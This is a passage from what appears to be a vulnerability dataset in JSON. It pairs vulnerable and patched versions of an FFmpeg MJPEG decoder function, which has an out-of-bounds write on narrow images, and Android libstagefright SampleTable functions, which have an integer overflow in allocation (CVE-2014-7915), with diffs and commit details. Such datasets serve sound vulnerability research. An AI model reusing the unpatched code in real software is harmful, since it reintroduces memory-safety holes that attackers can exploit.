ff_mjpeg_decode_sof(s)) < 0)\n                goto fail;\n            break;\n        case SOF3:\n            s->lossless    = 1;\n            s->ls          = 0;\n            s->progressive = 0;\n            if ((ret = ff_mjpeg_decode_sof(s)) < 0)\n                goto fail;\n            break;\n        case SOF48:\n            s->lossless    = 1;\n            s->ls          = 1;\n            s->progressive = 0;\n            if ((ret = ff_mjpeg_decode_sof(s)) < 0)\n                goto fail;\n            break;\n        case LSE:\n            if (!CONFIG_JPEGLS_DECODER ||\n                (ret = ff_jpegls_decode_lse(s)) < 0)\n                goto fail;\n            break;\n        case EOI:\neoi_parser:\n            s->cur_scan = 0;\n            if (!s->got_picture) {\n                av_log(avctx, AV_LOG_WARNING,\n                       \"Found EOI before any SOF, ignoring\\n\");\n                break;\n            }\n            if (s->interlaced) {\n                s->bottom_field ^= 1;\n                /* if not bottom field, do not output image yet */\n                if (s->bottom_field == !s->interlace_polarity)\n                    break;\n            }\n            if ((ret = av_frame_ref(frame, s->picture_ptr)) < 0)\n                return ret;\n            *got_frame = 1;\n            s->got_picture = 0;\n\n            if (!s->lossless) {\n                int qp = FFMAX3(s->qscale[0],\n                                s->qscale[1],\n                                s->qscale[2]);\n                int qpw = (s->width + 15) / 16;\n                AVBufferRef *qp_table_buf = av_buffer_alloc(qpw);\n                if (qp_table_buf) {\n                    memset(qp_table_buf->data, qp, qpw);\n                    av_frame_set_qp_table(data, qp_table_buf, 0, FF_QSCALE_TYPE_MPEG1);\n                }\n\n                if(avctx->debug & FF_DEBUG_QP)\n                    av_log(avctx, AV_LOG_DEBUG, \"QP: %d\\n\", qp);\n            }\n\n            goto the_end;\n        case SOS:\n            s->cur_scan++;\n            if ((ret = ff_mjpeg_decode_sos(s, NULL, 0, NULL)) < 0 &&\n                (avctx->err_recognition & AV_EF_EXPLODE))\n                goto fail;\n            break;\n        case DRI:\n            mjpeg_decode_dri(s);\n            break;\n        case SOF5:\n        case SOF6:\n        case SOF7:\n        case SOF9:\n        case SOF10:\n        case SOF11:\n        case SOF13:\n        case SOF14:\n        case SOF15:\n        case JPG:\n            av_log(avctx, AV_LOG_ERROR,\n                   \"mjpeg: unsupported coding type (%x)\\n\", start_code);\n            break;\n        }\n\n        /* eof process start code */\n        buf_ptr += (get_bits_count(&s->gb) + 7) / 8;\n        av_log(avctx, AV_LOG_DEBUG,\n               \"marker parser used %d bytes (%d bits)\\n\",\n               (get_bits_count(&s->gb) + 7) / 8, get_bits_count(&s->gb));\n    }\n    if (s->got_picture && s->cur_scan) {\n        av_log(avctx, AV_LOG_WARNING, \"EOI missing, emulating\\n\");\n        goto eoi_parser;\n    }\n    av_log(avctx, AV_LOG_FATAL, \"No JPEG data found in image\\n\");\n    return AVERROR_INVALIDDATA;\nfail:\n    s->got_picture = 0;\n    return ret;\nthe_end:\n\n    is16bit = av_pix_fmt_desc_get(s->avctx->pix_fmt)->comp[0].step_minus1;\n\n    if (AV_RB32(s->upscale_h)) {\n        int p;\n        av_assert0(avctx->pix_fmt == AV_PIX_FMT_YUVJ444P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV444P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVJ440P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV440P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA444P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVJ420P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV420P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV420P16||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA420P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA420P16||\n                   avctx->pix_fmt == AV_PIX_FMT_GBRP     ||\n                   avctx->pix_fmt == AV_PIX_FMT_GBRAP\n                  );\n        avcodec_get_chroma_sub_sample(s->avctx->pix_fmt, &hshift, &vshift);\n        for (p = 0; p<4; p++) {\n            uint8_t *line = s->picture_ptr->data[p];\n            int w = s->width;\n            int h = s->height;\n            if (!s->upscale_h[p])\n                continue;\n            if (p==1 || p==2) {\n                w = FF_CEIL_RSHIFT(w, hshift);\n                h = FF_CEIL_RSHIFT(h, vshift);\n            }\n            if (s->upscale_v[p])\n                h = (h+1)>>1;\n            av_assert0(w > 0);\n            for (i = 0; i < h; i++) {\n                if (s->upscale_h[p] == 1) {\n                    if (is16bit) ((uint16_t*)line)[w - 1] = ((uint16_t*)line)[(w - 1) / 2];\n                    else                      line[w - 1] = line[(w - 1) / 2];\n                    for (index = w - 2; index > 0; index--) {\n                        if (is16bit)\n                            ((uint16_t*)line)[index] = (((uint16_t*)line)[index / 2] + ((uint16_t*)line)[(index + 1) / 2]) >> 1;\n                        else\n                            line[index] = (line[index / 2] + line[(index + 1) / 2]) >> 1;\n                    }\n                } else if (s->upscale_h[p] == 2) {\n                    if (is16bit) {\n                        ((uint16_t*)line)[w - 1] =\n                        ((uint16_t*)line)[w - 2] = ((uint16_t*)line)[(w - 1) / 3];\n                    } else {\n                        line[w - 1] =\n                        line[w - 2] = line[(w - 1) / 3];\n                    }\n                    for (index = w - 3; index > 0; index--) {\n                        line[index] = (line[index / 3] + line[(index + 1) / 3] + line[(index + 2) / 3] + 1) / 3;\n                    }\n                }\n                line += s->linesize[p];\n            }\n        }\n    }\n    if (AV_RB32(s->upscale_v)) {\n        int p;\n        av_assert0(avctx->pix_fmt == AV_PIX_FMT_YUVJ444P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV444P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVJ422P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV422P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVJ420P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV420P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV440P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVJ440P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA444P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA420P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA420P16||\n                   avctx->pix_fmt == AV_PIX_FMT_GBRP     ||\n                   avctx->pix_fmt == AV_PIX_FMT_GBRAP\n                   );\n        avcodec_get_chroma_sub_sample(s->avctx->pix_fmt, &hshift, &vshift);\n        for (p = 0; p < 4; p++) {\n            uint8_t *dst;\n            int w = s->width;\n            int h = s->height;\n            if (!s->upscale_v[p])\n                continue;\n            if (p==1 || p==2) {\n                w = FF_CEIL_RSHIFT(w, hshift);\n                h = FF_CEIL_RSHIFT(h, vshift);\n            }\n            dst = &((uint8_t *)s->picture_ptr->data[p])[(h - 1) * s->linesize[p]];\n            for (i = h - 1; i; i--) {\n                uint8_t *src1 = &((uint8_t *)s->picture_ptr->data[p])[i / 2 * s->linesize[p]];\n                uint8_t *src2 = &((uint8_t *)s->picture_ptr->data[p])[(i + 1) / 2 * s->linesize[p]];\n                if (src1 == src2 || i == h - 1) {\n                    memcpy(dst, src1, w);\n                } else {\n                    for (index = 0; index < w; index++)\n                        dst[index] = (src1[index] + src2[index]) >> 1;\n                }\n                dst -= s->linesize[p];\n            }\n        }\n    }\n    if (s->flipped) {\n        int j;\n        avcodec_get_chroma_sub_sample(s->avctx->pix_fmt, &hshift, &vshift);\n        for (index=0; index<4; index++) {\n            uint8_t *dst = s->picture_ptr->data[index];\n            int w = s->picture_ptr->width;\n            int h = s->picture_ptr->height;\n            if(index && index<3){\n                w = FF_CEIL_RSHIFT(w, hshift);\n                h = FF_CEIL_RSHIFT(h, vshift);\n            }\n            if(dst){\n                uint8_t *dst2 = dst + s->picture_ptr->linesize[index]*(h-1);\n                for (i=0; i<h/2; i++) {\n                    for (j=0; j<w; j++)\n                        FFSWAP(int, dst[j], dst2[j]);\n                    dst  += s->picture_ptr->linesize[index];\n                    dst2 -= s->picture_ptr->linesize[index];\n                }\n            }\n        }\n    }\n    if (s->adobe_transform == 0 && s->avctx->pix_fmt == AV_PIX_FMT_GBRAP) {\n        int w = s->picture_ptr->width;\n        int h = s->picture_ptr->height;\n        for (i=0; i<h; i++) {\n            int j;\n            uint8_t *dst[4];\n            for (index=0; index<4; index++) {\n                dst[index] =   s->picture_ptr->data[index]\n                             + s->picture_ptr->linesize[index]*i;\n            }\n            for (j=0; j<w; j++) {\n                int k = dst[3][j];\n                int r = dst[0][j] * k;\n                int g = dst[1][j] * k;\n                int b = dst[2][j] * k;\n                dst[0][j] = g*257 >> 16;\n                dst[1][j] = b*257 >> 16;\n                dst[2][j] = r*257 >> 16;\n                dst[3][j] = 255;\n            }\n        }\n    }\n    if (s->adobe_transform == 2 && s->avctx->pix_fmt == AV_PIX_FMT_YUVA444P) {\n        int w = s->picture_ptr->width;\n        int h = s->picture_ptr->height;\n        for (i=0; i<h; i++) {\n            int j;\n            uint8_t *dst[4];\n            for (index=0; index<4; index++) {\n                dst[index] =   s->picture_ptr->data[index]\n                             + s->picture_ptr->linesize[index]*i;\n            }\n            for (j=0; j<w; j++) {\n                int k = dst[3][j];\n                int r = (255 - dst[0][j]) * k;\n                int g = (128 - dst[1][j]) * k;\n                int b = (128 - dst[2][j]) * k;\n                dst[0][j] = r*257 >> 16;\n                dst[1][j] = (g*257 >> 16) + 128;\n                dst[2][j] = (b*257 >> 16) + 128;\n                dst[3][j] = 255;\n            }\n        }\n    }\n\n    if (s->stereo3d) {\n        AVStereo3D *stereo = av_stereo3d_create_side_data(data);\n        if (stereo) {\n            stereo->type  = s->stereo3d->type;\n            stereo->flags = s->stereo3d->flags;\n        }\n        av_freep(&s->stereo3d);\n    }\n\n    av_dict_copy(avpriv_frame_get_metadatap(data), s->exif_metadata, 0);\n    av_dict_free(&s->exif_metadata);\n\n    av_log(avctx, AV_LOG_DEBUG, \"decode frame unused %\"PTRDIFF_SPECIFIER\" bytes\\n\",\n           buf_end - buf_ptr);\n//  return buf_end - buf_ptr;\n    return buf_ptr - buf;\n}",
        "func": "int ff_mjpeg_decode_frame(AVCodecContext *avctx, void *data, int *got_frame,\n                          AVPacket *avpkt)\n{\n    AVFrame     *frame = data;\n    const uint8_t *buf = avpkt->data;\n    int buf_size       = avpkt->size;\n    MJpegDecodeContext *s = avctx->priv_data;\n    const uint8_t *buf_end, *buf_ptr;\n    const uint8_t *unescaped_buf_ptr;\n    int hshift, vshift;\n    int unescaped_buf_size;\n    int start_code;\n    int i, index;\n    int ret = 0;\n    int is16bit;\n\n    av_dict_free(&s->exif_metadata);\n    av_freep(&s->stereo3d);\n    s->adobe_transform = -1;\n\n    buf_ptr = buf;\n    buf_end = buf + buf_size;\n    while (buf_ptr < buf_end) {\n        /* find start next marker */\n        start_code = ff_mjpeg_find_marker(s, &buf_ptr, buf_end,\n                                          &unescaped_buf_ptr,\n                                          &unescaped_buf_size);\n        /* EOF */\n        if (start_code < 0) {\n            break;\n        } else if (unescaped_buf_size > INT_MAX / 8) {\n            av_log(avctx, AV_LOG_ERROR,\n                   \"MJPEG packet 0x%x too big (%d/%d), corrupt data?\\n\",\n                   start_code, unescaped_buf_size, buf_size);\n            return AVERROR_INVALIDDATA;\n        }\n        av_log(avctx, AV_LOG_DEBUG, \"marker=%x avail_size_in_buf=%\"PTRDIFF_SPECIFIER\"\\n\",\n               start_code, buf_end - buf_ptr);\n\n        ret = init_get_bits8(&s->gb, unescaped_buf_ptr, unescaped_buf_size);\n\n        if (ret < 0) {\n            av_log(avctx, AV_LOG_ERROR, \"invalid buffer\\n\");\n            goto fail;\n        }\n\n        s->start_code = start_code;\n        if (s->avctx->debug & FF_DEBUG_STARTCODE)\n            av_log(avctx, AV_LOG_DEBUG, \"startcode: %X\\n\", start_code);\n\n        /* process markers */\n        if (start_code >= 0xd0 && start_code <= 0xd7)\n            av_log(avctx, AV_LOG_DEBUG,\n                   \"restart marker: %d\\n\", start_code & 0x0f);\n            /* APP fields */\n        else if (start_code >= APP0 && start_code <= APP15)\n            mjpeg_decode_app(s);\n            /* Comment */\n        else if (start_code == COM)\n            mjpeg_decode_com(s);\n\n        ret = -1;\n\n        if (!CONFIG_JPEGLS_DECODER &&\n            (start_code == SOF48 || start_code == LSE)) {\n            av_log(avctx, AV_LOG_ERROR, \"JPEG-LS support not enabled.\\n\");\n            return AVERROR(ENOSYS);\n        }\n\n        switch (start_code) {\n        case SOI:\n            s->restart_interval = 0;\n            s->restart_count    = 0;\n            /* nothing to do on SOI */\n            break;\n        case DQT:\n            ff_mjpeg_decode_dqt(s);\n            break;\n        case DHT:\n            if ((ret = ff_mjpeg_decode_dht(s)) < 0) {\n                av_log(avctx, AV_LOG_ERROR, \"huffman table decode error\\n\");\n                goto fail;\n            }\n            break;\n        case SOF0:\n        case SOF1:\n            s->lossless    = 0;\n            s->ls          = 0;\n            s->progressive = 0;\n            if ((ret = ff_mjpeg_decode_sof(s)) < 0)\n                goto fail;\n            break;\n        case SOF2:\n            s->lossless    = 0;\n            s->ls          = 0;\n            s->progressive = 1;\n            if ((ret = ff_mjpeg_decode_sof(s)) < 0)\n                goto fail;\n            break;\n        case SOF3:\n            s->lossless    = 1;\n            s->ls          = 0;\n            s->progressive = 0;\n            if ((ret = ff_mjpeg_decode_sof(s)) < 0)\n                goto fail;\n            break;\n        case SOF48:\n            s->lossless    = 1;\n            s->ls          = 1;\n            s->progressive = 0;\n            if ((ret = ff_mjpeg_decode_sof(s)) < 0)\n                goto fail;\n            break;\n        case LSE:\n            if (!CONFIG_JPEGLS_DECODER ||\n                (ret = ff_jpegls_decode_lse(s)) < 0)\n                goto fail;\n            break;\n        case EOI:\neoi_parser:\n            s->cur_scan = 0;\n            if (!s->got_picture) {\n                av_log(avctx, AV_LOG_WARNING,\n                       \"Found EOI before any SOF, ignoring\\n\");\n                break;\n            }\n            if (s->interlaced) {\n                s->bottom_field ^= 1;\n                /* if not bottom field, do not output image yet */\n                if (s->bottom_field == !s->interlace_polarity)\n                    break;\n            }\n            if ((ret = av_frame_ref(frame, s->picture_ptr)) < 0)\n                return ret;\n            *got_frame = 1;\n            s->got_picture = 0;\n\n            if (!s->lossless) {\n                int qp = FFMAX3(s->qscale[0],\n                                s->qscale[1],\n                                s->qscale[2]);\n                int qpw = (s->width + 15) / 16;\n                AVBufferRef *qp_table_buf = av_buffer_alloc(qpw);\n                if (qp_table_buf) {\n                    memset(qp_table_buf->data, qp, qpw);\n                    av_frame_set_qp_table(data, qp_table_buf, 0, FF_QSCALE_TYPE_MPEG1);\n                }\n\n                if(avctx->debug & FF_DEBUG_QP)\n                    av_log(avctx, AV_LOG_DEBUG, \"QP: %d\\n\", qp);\n            }\n\n            goto the_end;\n        case SOS:\n            s->cur_scan++;\n            if ((ret = ff_mjpeg_decode_sos(s, NULL, 0, NULL)) < 0 &&\n                (avctx->err_recognition & AV_EF_EXPLODE))\n                goto fail;\n            break;\n        case DRI:\n            mjpeg_decode_dri(s);\n            break;\n        case SOF5:\n        case SOF6:\n        case SOF7:\n        case SOF9:\n        case SOF10:\n        case SOF11:\n        case SOF13:\n        case SOF14:\n        case SOF15:\n        case JPG:\n            av_log(avctx, AV_LOG_ERROR,\n                   \"mjpeg: unsupported coding type (%x)\\n\", start_code);\n            break;\n        }\n\n        /* eof process start code */\n        buf_ptr += (get_bits_count(&s->gb) + 7) / 8;\n        av_log(avctx, AV_LOG_DEBUG,\n               \"marker parser used %d bytes (%d bits)\\n\",\n               (get_bits_count(&s->gb) + 7) / 8, get_bits_count(&s->gb));\n    }\n    if (s->got_picture && s->cur_scan) {\n        av_log(avctx, AV_LOG_WARNING, \"EOI missing, emulating\\n\");\n        goto eoi_parser;\n    }\n    av_log(avctx, AV_LOG_FATAL, \"No JPEG data found in image\\n\");\n    return AVERROR_INVALIDDATA;\nfail:\n    s->got_picture = 0;\n    return ret;\nthe_end:\n\n    is16bit = av_pix_fmt_desc_get(s->avctx->pix_fmt)->comp[0].step_minus1;\n\n    if (AV_RB32(s->upscale_h)) {\n        int p;\n        av_assert0(avctx->pix_fmt == AV_PIX_FMT_YUVJ444P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV444P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVJ440P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV440P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA444P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVJ420P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV420P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV420P16||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA420P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA420P16||\n                   avctx->pix_fmt == AV_PIX_FMT_GBRP     ||\n                   avctx->pix_fmt == AV_PIX_FMT_GBRAP\n                  );\n        avcodec_get_chroma_sub_sample(s->avctx->pix_fmt, &hshift, &vshift);\n        for (p = 0; p<4; p++) {\n            uint8_t *line = s->picture_ptr->data[p];\n            int w = s->width;\n            int h = s->height;\n            if (!s->upscale_h[p])\n                continue;\n            if (p==1 || p==2) {\n                w = FF_CEIL_RSHIFT(w, hshift);\n                h = FF_CEIL_RSHIFT(h, vshift);\n            }\n            if (s->upscale_v[p])\n                h = (h+1)>>1;\n            av_assert0(w > 0);\n            for (i = 0; i < h; i++) {\n                if (s->upscale_h[p] == 1) {\n                    if (is16bit) ((uint16_t*)line)[w - 1] = ((uint16_t*)line)[(w - 1) / 2];\n                    else                      line[w - 1] = line[(w - 1) / 2];\n                    for (index = w - 2; index > 0; index--) {\n                        if (is16bit)\n                            ((uint16_t*)line)[index] = (((uint16_t*)line)[index / 2] + ((uint16_t*)line)[(index + 1) / 2]) >> 1;\n                        else\n                            line[index] = (line[index / 2] + line[(index + 1) / 2]) >> 1;\n                    }\n                } else if (s->upscale_h[p] == 2) {\n                    if (is16bit) {\n                        ((uint16_t*)line)[w - 1] = ((uint16_t*)line)[(w - 1) / 3];\n                        if (w > 1)\n                            ((uint16_t*)line)[w - 2] = ((uint16_t*)line)[w - 1];\n                    } else {\n                        line[w - 1] = line[(w - 1) / 3];\n                        if (w > 1)\n                            line[w - 2] = line[w - 1];\n                    }\n                    for (index = w - 3; index > 0; index--) {\n                        line[index] = (line[index / 3] + line[(index + 1) / 3] + line[(index + 2) / 3] + 1) / 3;\n                    }\n                }\n                line += s->linesize[p];\n            }\n        }\n    }\n    if (AV_RB32(s->upscale_v)) {\n        int p;\n        av_assert0(avctx->pix_fmt == AV_PIX_FMT_YUVJ444P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV444P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVJ422P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV422P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVJ420P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV420P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUV440P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVJ440P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA444P ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA420P  ||\n                   avctx->pix_fmt == AV_PIX_FMT_YUVA420P16||\n                   avctx->pix_fmt == AV_PIX_FMT_GBRP     ||\n                   avctx->pix_fmt == AV_PIX_FMT_GBRAP\n                   );\n        avcodec_get_chroma_sub_sample(s->avctx->pix_fmt, &hshift, &vshift);\n        for (p = 0; p < 4; p++) {\n            uint8_t *dst;\n            int w = s->width;\n            int h = s->height;\n            if (!s->upscale_v[p])\n                continue;\n            if (p==1 || p==2) {\n                w = FF_CEIL_RSHIFT(w, hshift);\n                h = FF_CEIL_RSHIFT(h, vshift);\n            }\n            dst = &((uint8_t *)s->picture_ptr->data[p])[(h - 1) * s->linesize[p]];\n            for (i = h - 1; i; i--) {\n                uint8_t *src1 = &((uint8_t *)s->picture_ptr->data[p])[i / 2 * s->linesize[p]];\n                uint8_t *src2 = &((uint8_t *)s->picture_ptr->data[p])[(i + 1) / 2 * s->linesize[p]];\n                if (src1 == src2 || i == h - 1) {\n                    memcpy(dst, src1, w);\n                } else {\n                    for (index = 0; index < w; index++)\n                        dst[index] = (src1[index] + src2[index]) >> 1;\n                }\n                dst -= s->linesize[p];\n            }\n        }\n    }\n    if (s->flipped) {\n        int j;\n        avcodec_get_chroma_sub_sample(s->avctx->pix_fmt, &hshift, &vshift);\n        for (index=0; index<4; index++) {\n            uint8_t *dst = s->picture_ptr->data[index];\n            int w = s->picture_ptr->width;\n            int h = s->picture_ptr->height;\n            if(index && index<3){\n                w = FF_CEIL_RSHIFT(w, hshift);\n                h = FF_CEIL_RSHIFT(h, vshift);\n            }\n            if(dst){\n                uint8_t *dst2 = dst + s->picture_ptr->linesize[index]*(h-1);\n                for (i=0; i<h/2; i++) {\n                    for (j=0; j<w; j++)\n                        FFSWAP(int, dst[j], dst2[j]);\n                    dst  += s->picture_ptr->linesize[index];\n                    dst2 -= s->picture_ptr->linesize[index];\n                }\n            }\n        }\n    }\n    if (s->adobe_transform == 0 && s->avctx->pix_fmt == AV_PIX_FMT_GBRAP) {\n        int w = s->picture_ptr->width;\n        int h = s->picture_ptr->height;\n        for (i=0; i<h; i++) {\n            int j;\n            uint8_t *dst[4];\n            for (index=0; index<4; index++) {\n                dst[index] =   s->picture_ptr->data[index]\n                             + s->picture_ptr->linesize[index]*i;\n            }\n            for (j=0; j<w; j++) {\n                int k = dst[3][j];\n                int r = dst[0][j] * k;\n                int g = dst[1][j] * k;\n                int b = dst[2][j] * k;\n                dst[0][j] = g*257 >> 16;\n                dst[1][j] = b*257 >> 16;\n                dst[2][j] = r*257 >> 16;\n                dst[3][j] = 255;\n            }\n        }\n    }\n    if (s->adobe_transform == 2 && s->avctx->pix_fmt == AV_PIX_FMT_YUVA444P) {\n        int w = s->picture_ptr->width;\n        int h = s->picture_ptr->height;\n        for (i=0; i<h; i++) {\n            int j;\n            uint8_t *dst[4];\n            for (index=0; index<4; index++) {\n                dst[index] =   s->picture_ptr->data[index]\n                             + s->picture_ptr->linesize[index]*i;\n            }\n            for (j=0; j<w; j++) {\n                int k = dst[3][j];\n                int r = (255 - dst[0][j]) * k;\n                int g = (128 - dst[1][j]) * k;\n                int b = (128 - dst[2][j]) * k;\n                dst[0][j] = r*257 >> 16;\n                dst[1][j] = (g*257 >> 16) + 128;\n                dst[2][j] = (b*257 >> 16) + 128;\n                dst[3][j] = 255;\n            }\n        }\n    }\n\n    if (s->stereo3d) {\n        AVStereo3D *stereo = av_stereo3d_create_side_data(data);\n        if (stereo) {\n            stereo->type  = s->stereo3d->type;\n            stereo->flags = s->stereo3d->flags;\n        }\n        av_freep(&s->stereo3d);\n    }\n\n    av_dict_copy(avpriv_frame_get_metadatap(data), s->exif_metadata, 0);\n    av_dict_free(&s->exif_metadata);\n\n    av_log(avctx, AV_LOG_DEBUG, \"decode frame unused %\"PTRDIFF_SPECIFIER\" bytes\\n\",\n           buf_end - buf_ptr);\n//  return buf_end - buf_ptr;\n    return buf_ptr - buf;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -235,11 +235,13 @@\n                     }\n                 } else if (s->upscale_h[p] == 2) {\n                     if (is16bit) {\n-                        ((uint16_t*)line)[w - 1] =\n-                        ((uint16_t*)line)[w - 2] = ((uint16_t*)line)[(w - 1) / 3];\n+                        ((uint16_t*)line)[w - 1] = ((uint16_t*)line)[(w - 1) / 3];\n+                        if (w > 1)\n+                            ((uint16_t*)line)[w - 2] = ((uint16_t*)line)[w - 1];\n                     } else {\n-                        line[w - 1] =\n-                        line[w - 2] = line[(w - 1) / 3];\n+                        line[w - 1] = line[(w - 1) / 3];\n+                        if (w > 1)\n+                            line[w - 2] = line[w - 1];\n                     }\n                     for (index = w - 3; index > 0; index--) {\n                         line[index] = (line[index / 3] + line[(index + 1) / 3] + line[(index + 2) / 3] + 1) / 3;",
        "diff_line_info": {
            "deleted_lines": [
                "                        ((uint16_t*)line)[w - 1] =",
                "                        ((uint16_t*)line)[w - 2] = ((uint16_t*)line)[(w - 1) / 3];",
                "                        line[w - 1] =",
                "                        line[w - 2] = line[(w - 1) / 3];"
            ],
            "added_lines": [
                "                        ((uint16_t*)line)[w - 1] = ((uint16_t*)line)[(w - 1) / 3];",
                "                        if (w > 1)",
                "                            ((uint16_t*)line)[w - 2] = ((uint16_t*)line)[w - 1];",
                "                        line[w - 1] = line[(w - 1) / 3];",
                "                        if (w > 1)",
                "                            line[w - 2] = line[w - 1];"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-7915",
        "func_name": "android/SampleTable::setCompositionTimeToSampleParams",
        "description": "Integer overflow in SampleTable.cpp in libstagefright in Android before 5.0.0 has unspecified impact and attack vectors, aka internal bug 15328708.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/edd4a76eb4747bd19ed122df46fa46b452c12a0d",
        "commit_title": "SampleTable: check integer overflow during table alloc",
        "commit_text": " Bug: 15328708 Bug: 15342615 Bug: 15342751 ",
        "func_before": "status_t SampleTable::setCompositionTimeToSampleParams(\n        off64_t data_offset, size_t data_size) {\n    ALOGI(\"There are reordered frames present.\");\n\n    if (mCompositionTimeDeltaEntries != NULL || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header))\n            < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    size_t numEntries = U32_AT(&header[4]);\n\n    if (data_size != (numEntries + 1) * 8) {\n        return ERROR_MALFORMED;\n    }\n\n    mNumCompositionTimeDeltaEntries = numEntries;\n    mCompositionTimeDeltaEntries = new uint32_t[2 * numEntries];\n\n    if (mDataSource->readAt(\n                data_offset + 8, mCompositionTimeDeltaEntries, numEntries * 8)\n            < (ssize_t)numEntries * 8) {\n        delete[] mCompositionTimeDeltaEntries;\n        mCompositionTimeDeltaEntries = NULL;\n\n        return ERROR_IO;\n    }\n\n    for (size_t i = 0; i < 2 * numEntries; ++i) {\n        mCompositionTimeDeltaEntries[i] = ntohl(mCompositionTimeDeltaEntries[i]);\n    }\n\n    mCompositionDeltaLookup->setEntries(\n            mCompositionTimeDeltaEntries, mNumCompositionTimeDeltaEntries);\n\n    return OK;\n}",
        "func": "status_t SampleTable::setCompositionTimeToSampleParams(\n        off64_t data_offset, size_t data_size) {\n    ALOGI(\"There are reordered frames present.\");\n\n    if (mCompositionTimeDeltaEntries != NULL || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header))\n            < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    size_t numEntries = U32_AT(&header[4]);\n\n    if (data_size != (numEntries + 1) * 8) {\n        return ERROR_MALFORMED;\n    }\n\n    mNumCompositionTimeDeltaEntries = numEntries;\n    uint64_t allocSize = numEntries * 2 * sizeof(uint32_t);\n    if (allocSize > SIZE_MAX) {\n        return ERROR_OUT_OF_RANGE;\n    }\n\n    mCompositionTimeDeltaEntries = new uint32_t[2 * numEntries];\n\n    if (mDataSource->readAt(\n                data_offset + 8, mCompositionTimeDeltaEntries, numEntries * 8)\n            < (ssize_t)numEntries * 8) {\n        delete[] mCompositionTimeDeltaEntries;\n        mCompositionTimeDeltaEntries = NULL;\n\n        return ERROR_IO;\n    }\n\n    for (size_t i = 0; i < 2 * numEntries; ++i) {\n        mCompositionTimeDeltaEntries[i] = ntohl(mCompositionTimeDeltaEntries[i]);\n    }\n\n    mCompositionDeltaLookup->setEntries(\n            mCompositionTimeDeltaEntries, mNumCompositionTimeDeltaEntries);\n\n    return OK;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -25,6 +25,11 @@\n     }\n \n     mNumCompositionTimeDeltaEntries = numEntries;\n+    uint64_t allocSize = numEntries * 2 * sizeof(uint32_t);\n+    if (allocSize > SIZE_MAX) {\n+        return ERROR_OUT_OF_RANGE;\n+    }\n+\n     mCompositionTimeDeltaEntries = new uint32_t[2 * numEntries];\n \n     if (mDataSource->readAt(",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "    uint64_t allocSize = numEntries * 2 * sizeof(uint32_t);",
                "    if (allocSize > SIZE_MAX) {",
                "        return ERROR_OUT_OF_RANGE;",
                "    }",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2014-7915",
        "func_name": "android/SampleTable::setTimeToSampleParams",
        "description": "Integer overflow in SampleTable.cpp in libstagefright in Android before 5.0.0 has unspecified impact and attack vectors, aka internal bug 15328708.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/edd4a76eb4747bd19ed122df46fa46b452c12a0d",
        "commit_title": "SampleTable: check integer overflow during table alloc",
        "commit_text": " Bug: 15328708 Bug: 15342615 Bug: 15342751 ",
